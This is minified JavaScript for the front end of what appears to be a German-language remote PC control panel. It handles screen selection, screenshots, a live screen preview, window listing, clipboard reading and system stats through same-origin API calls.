function clearExtras(){stopPreview();extrasEpoch++;if(previewUrl)URL.revokeObjectURL(previewUrl);previewUrl=null;document.getElementById('screen-preview').removeAttribute('src');document.getElementById('screen-preview').classList.add('hidden');document.getElementById('screen-download').removeAttribute('href');document.getElementById('screen-download').classList.add('hidden');document.getElementById('clipboard-text').value='';document.getElementById('pc-message').value='';document.getElementById('screen-select').replaceChildren(new Option('Bildschirm 1','0'));document.getElementById('window-select').replaceChildren(new Option('Zuerst Liste laden',''));document.getElementById('pc-stats').textContent='';}
async function readExtra(path){const r=await fetch(path,{headers:{'X-Panic-Control':'1'}}),d=await r.json();if(!r.ok)throw Error(d.error);return d;}
async function loadScreens(){if(!allowedId('screenshotView')&&!allowedId('livePreview'))return;const epoch=extrasEpoch;try{const list=await readExtra(allowedId('screenshotView')?'/api/screens':'/api/preview/screens');if(epoch!==extrasEpoch)return;document.getElementById('screen-select').replaceChildren(...list.map(s=>new Option(s.label,s.id)));}catch(e){if(epoch===extrasEpoch)toast(e.message,'error');}}
function setPreview(active,lease){previewActive=active;previewLease=active?lease:'';previewSerial++;clearTimeout(previewTimer);const button=document.querySelector('[data-action="livePreview"]');button.querySelector('span').textContent=active?'Live-Vorschau stoppen':'Live-Vorschau starten';document.getElementById('preview-status').textContent=active?'Live · ca. 1 Bild pro Sekunde':'';renderCooldowns();if(active){if(document.hidden||!document.getElementById('tab-extras').classList.contains('active')){stopPreview();return;}fetchPreview(previewSerial);}}
function stopPreview(){if(previewActive&&wsConnected)send({cmd:'preview',value:false});if(previewActive)setPreview(false);}
async function fetchPreview(serial){if(!previewActive||serial!==previewSerial)return;const screen=document.getElementById('screen-select').value;try{const r=await fetch('/api/preview?screen='+encodeURIComponent(screen)+'&lease='+encodeURIComponent(previewLease),{headers:{'X-Panic-Control':'1'}});if(r.status!==429){if(!r.ok){const d=await r.json();throw Error(d.error);}const b=await r.blob();if(!previewActive||serial!==previewSerial)return;if(screen===document.getElementById('screen-select').value){if(previewUrl)URL.revokeObjectURL(previewUrl);previewUrl=URL.createObjectURL(b);const img=document.getElementById('screen-preview');img.src=previewUrl;img.classList.remove('hidden');const a=document.getElementById('screen-download');a.href=previewUrl;a.classList.remove('hidden');}}}catch(e){if(serial===previewSerial){stopPreview();toast(e.message,'error');}return;}if(previewActive&&serial===previewSerial)previewTimer=setTimeout(()=>fetchPreview(serial),1100);}
document.addEventListener('visibilitychange',()=>{if(document.hidden)stopPreview();});
async function getScreenshot(){const epoch=extrasEpoch;try{const r=await fetch('/api/screenshot?screen='+encodeURIComponent(document.getElementById('screen-select').value),{headers:{'X-Panic-Control':'1'}});if(!r.ok){const d=await r.json();throw Error(d.error);}const b=await r.blob();if(epoch!==extrasEpoch)return;if(previewUrl)URL.revokeObjectURL(previewUrl);previewUrl=URL.createObjectURL(b);const img=document.getElementById('screen-preview');img.src=previewUrl;img.classList.remove('hidden');const a=document.getElementById('screen-download');a.href=previewUrl;a.classList.remove('hidden');}catch(e){if(epoch===extrasEpoch)toast(e.message,'error');}}
async function getWindows(){const epoch=extrasEpoch;try{const list=await readExtra('/api/windows');if(epoch!==extrasEpoch)return;document.getElementById('window-select').replaceChildren(...(list.length?list.map(w=>new Option(w.title,w.id)):[new Option('Keine Fenster verfügbar','')]));}catch(e){if(epoch===extrasEpoch)toast(e.message,'error');}}
async function getClipboard(){const epoch=extrasEpoch;try{const d=await readExtra('/api/clipboard');if(epoch!==extrasEpoch)return;document.getElementById('clipboard-text').value=d.text;toast('PC-Text geladen');}catch(e){if(epoch===extrasEpoch)toast(e.message,'error');}}
async function getStats(){const epoch=extrasEpoch;try{const d=await readExtra('/api/stats');if(epoch!==extrasEpoch)return;document.getElementById('pc-stats').textContent=d.name+' · CPU '+d.cpu+' % · RAM '+d.memory+' % · Laufzeit '+d.uptime;}catch(e){if(epoch===extrasEpoch)toast(e.message,'error');}}
setInterval(function(){if(wsConnected&&!document.hidden)send({cmd:'heartbeat'});},10000);
